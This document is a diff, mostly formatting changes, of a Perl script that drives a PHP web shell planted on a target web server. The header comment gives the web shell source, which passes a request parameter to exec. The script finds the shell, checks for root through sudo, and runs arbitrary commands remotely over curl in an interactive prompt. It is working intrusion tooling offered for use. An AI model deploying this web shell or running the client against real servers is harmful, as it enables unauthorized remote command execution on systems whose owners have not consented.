@@ -1,4 +1,4 @@
-#!/opt/local/bin/perl
+#!/usr/bin/env perl
 
 ##########################################################
 # This perl script interacts with a simple php shell.    #
@@ -16,26 +16,26 @@
 # - clean up code, always    #    if there are multiple  #
 # - Base64 encode URL?       #    in one command         #
 ##########################################################
-# Here is the simple shell to upload to the target	 #
+# Here is the simple shell to upload to the target       #
 # <?php                                                  #
-# 	 $cmd = $_REQUEST["s"];                          #
-#	 exec($cmd, $out);                               #
-#	 foreach ($out as $line){                        #
-#		 echo "$line <br>";                      #
-#	 }                                               #
+#    $cmd = $_REQUEST["s"];                              #
+#  exec($cmd, $out);                                     #
+#  foreach ($out as $line){                              #
+#    echo "$line <br>";                                  #
+#  }                                                     #
 # ?>                                                     #
 ##########################################################
 
 use warnings;
 use strict;
-our $pwd; #working directory variable 
-our $loc; #web address of web shell
-our $user; #user being used to run commands
-our $curl; #curl+options+$loc+s
-our $debug; # debug variable
-our $isctrlc; #if control c has been triggered this variable will be set, helps with prompt
+our $pwd;            # working directory variable 
+our $loc;            # web address of web shell
+our $user;           # user being used to run commands
+our $curl;           # curl+options+$loc+s
+our $debug;          # debug variable
+our $isctrlc;        # if control c has been triggered this variable will be set, helps with prompt
 our $promptsign = "\$";
-$SIG{INT} = \&ctrlc; #defines control-C action
+$SIG{INT} = \&ctrlc; # defines control-C action
 
 ############################
 # Simple function to strip #
@@ -44,11 +44,11 @@ $SIG{INT} = \&ctrlc; #defines control-C action
 # to \n's as well for      #
 # nicer output.            #
 ############################
-sub StripTags{
-	if (defined($_[1])){
-		$_[0] =~ s/<br>/\n/g;
-	}
-	$_[0] =~ s/<\w+>|<\/\w+>//g;
+sub StripTags {
+  if (defined($_[1])){
+    $_[0] =~ s/<br>/\n/g;
+  }
+  $_[0] =~ s/<\w+>|<\/\w+>//g;
 }
 
 ############################
@@ -59,11 +59,11 @@ sub StripTags{
 # pwd (dir after command   #
 #   HEY IT WORKS OKAY?!?   #
 ############################
-sub cd{
-	my $fullcmd = URLEncode("cd $pwd;$_[0];pwd");
-	$pwd = `$curl=$fullcmd`;
-	StripTags($pwd);
-	$pwd =~ s/^\s+|\s+$//g;	
+sub cd {
+  my $fullcmd = URLEncode("cd $pwd;$_[0];pwd");
+  $pwd = `$curl=$fullcmd`;
+  StripTags($pwd);
+  $pwd =~ s/^\s+|\s+$//g; 
 }
 
 ############################
@@ -73,12 +73,12 @@ sub cd{
 # returns the URL encoded  #
 # string                   #
 ############################
-sub URLEncode{
-    my $encodedstr = "";
-    foreach (split //, $_[0]) {
-        $encodedstr .= "%".unpack "H*", $_;
-    }
-    return uc($encodedstr);
+sub URLEncode {
+  my $encodedstr = "";
+  foreach (split //, $_[0]) {
+    $encodedstr .= "%".unpack "H*", $_;
+  }
+  return uc($encodedstr);
 }
 
 ############################
@@ -86,10 +86,10 @@ sub URLEncode{
 # Kills curl and returns   #
 # to the shell.            #
 ############################
-sub ctrlc{
-	`killall -9 curl &>/dev/null`;
-        $isctrlc = 1;
-	print "\n$pwd $user$promptsign ";
+sub ctrlc {
+  `killall -9 curl &>/dev/null`;
+  $isctrlc = 1;
+  print "\n$pwd $user$promptsign ";
 }
 
 ############################
@@ -97,70 +97,67 @@ sub ctrlc{
 # program. Runs commands   #
 # with curl.               #
 ############################
-sub shell{
-        if (!$isctrlc){
-	    print "\n$pwd $user$promptsign "; #prints shell-like prompt
-        }
-        $isctrlc = 0;
-	chomp(my $input = <STDIN>);
-	my @parts = split(';',$input);
-	if ($input eq "quit" || $input eq "exit"){
-		exit;
-	}
-        if ($input eq ""){
-            return;
-        }
-        if ($input eq "debugon"){
-                $debug=1;
-                return;
-        }
-        if ($input eq "debugoff"){
-                $debug=0;
-                return;
-        }
-        if ($debug){
-            print "debug: $input\n";
-            print "debug: $curl=cd $pwd;$input 2>&1\n";
-        }
-        my $fullcmd = URLEncode("cd $pwd;$input 2>&1");
-        if ($debug){print "debug: $curl=$fullcmd\n";}
-	foreach my $cmd (@parts){
-		if ($cmd =~ m/cd \S+/){
-			cd($cmd);
-		}
-	}
-
-	chomp(my $output = `$curl=$fullcmd`); #runs command and captures output
-	#clean up output
-	StripTags($output,1);
-	chomp($output);
-	$output =~ s/^\s+|\s+$//g;
-
-	if ($output ne ""){
-		print "$output";
-	}
+sub shell {
+  if (!$isctrlc) {
+    print "\n$pwd $user$promptsign "; #prints shell-like prompt
+  }
+  $isctrlc = 0;
+  chomp(my $input = <STDIN>);
+  my @parts = split(';',$input);
+  if ($input eq "quit" || $input eq "exit"){
+    exit;
+  }
+  if ($input eq "") {
+    return;
+  }
+  if ($input eq "debugon") {
+    $debug = 1;
+    return;
+  }
+  if ($input eq "debugoff") {
+    $debug = 0;
+    return;
+  }
+  if ($debug) {
+    print "debug: $input\n";
+    print "debug: $curl=cd $pwd;$input 2>&1\n";
+  }
+  my $fullcmd = URLEncode("cd $pwd;$input 2>&1");
+  if ($debug) { print "debug: $curl=$fullcmd\n"; }
+  foreach my $cmd (@parts){
+    if ($cmd =~ m/cd \S+/){
+     cd($cmd);
+    }
+  }
+  chomp(my $output = `$curl=$fullcmd`); # runs command and captures output
+  # clean up output
+  StripTags($output, 1);
+  chomp($output);
+  $output =~ s/^\s+|\s+$//g;
+  if ($output ne "") {
+    print "$output";
+  }
 }
 
-#prompt for, get, and check for existence of a web shell at the user spcified address.
+# prompt for, get, and check for existence of a web shell at the user spcified address.
 print "Address of shell: ";
 chomp($loc = <STDIN>);
-#set up $curl variable
 $curl = "curl -s $loc?%73";
 my $cmd = URLEncode("echo index.php");
-if (`$curl=$cmd` =~ m/index\.php/){
-	print "Shell found!\n";
-}else{
-	print "Shell not found!\n";
-	exit;
+if (`$curl=$cmd` =~ m/index\.php/) {
+  print "Shell found!\n";
+} else {
+  print "Shell not found!\n";
+  exit;
 }
 
-#get current user and working dir for the prompt
+# get current user and working dir for the prompt
 my $enccmd = URLEncode("whoami");
 $user = `$curl=$enccmd`;
 $enccmd = URLEncode("sudo whoami");
-if (`$curl=$enccmd` =~ m/root/){
-    $promptsign = "#";
-    print "You have root priviledge with sudo (nopasswd) or the server is running as root!";
+if (`$curl=$enccmd` =~ m/root/) {
+  $promptsign = "#";
+  print "You have root privilege with sudo (nopasswd) or the server is running as root!";
 }
 StripTags($user);
 chomp($user);
@@ -171,7 +168,7 @@ chomp($pwd);
 $user =~ s/\s+$|^\s+//g;
 $pwd =~ s/^\s+|\s+$//g;
 
-#run the shell until "quit" or "exit"
-while (1){
-	shell();
+# run the shell until "quit" or "exit"
+while (1) {
+  shell();
 }
